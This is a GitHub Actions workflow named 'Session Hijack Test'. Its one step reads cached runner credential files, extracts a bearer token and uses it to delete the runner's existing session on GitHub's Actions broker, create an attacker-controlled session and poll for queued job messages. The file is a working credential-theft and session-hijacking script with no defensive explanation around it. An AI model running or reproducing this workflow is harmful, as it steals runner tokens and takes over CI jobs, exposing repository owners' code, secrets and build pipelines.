name: Session Hijack Test
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Hijack broker session
        run: |
          CREDS="/home/runner/actions-runner/cached/*/.credentials"
          for f in $CREDS; do
            TOKEN=$(python3 -c "import json; print(json.load(open('$f'))['Data']['token'])")
            
            echo "=== 1. Delete existing HCA session ==="
            curl -s -w "\nHTTP:%{http_code}" -X DELETE \
              -H "Authorization: Bearer $TOKEN" \
              "https://broker.actions.githubusercontent.com/session"
            
            echo ""
            echo "=== 2. Create OUR session ==="
            curl -s -w "\nHTTP:%{http_code}" -X POST \
              -H "Authorization: Bearer $TOKEN" \
              -H "Content-Type: application/json" \
              "https://broker.actions.githubusercontent.com/session" -d '{}'
            
            echo ""
            echo "=== 3. Poll /message (runner should be valid now) ==="
            RESP=$(curl -s -w "\nHTTP:%{http_code}" --max-time 8 \
              -H "Authorization: Bearer $TOKEN" \
              "https://broker.actions.githubusercontent.com/message")
            echo "$RESP" | head -5
            
            break
          done
